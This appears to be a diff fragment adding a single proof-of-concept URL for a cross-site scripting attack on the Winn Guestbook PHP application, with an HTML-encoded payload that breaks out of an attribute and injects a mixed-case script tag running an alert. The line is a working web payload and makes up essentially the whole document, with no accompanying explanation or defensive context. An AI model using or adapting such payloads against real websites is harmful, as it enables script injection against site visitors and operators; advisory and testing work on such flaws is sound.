@@ -1,0 +1,4 @@
+http://www.example.com/Winn-Guestbook[php]/index.php/&gt;&quot;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+
+
+
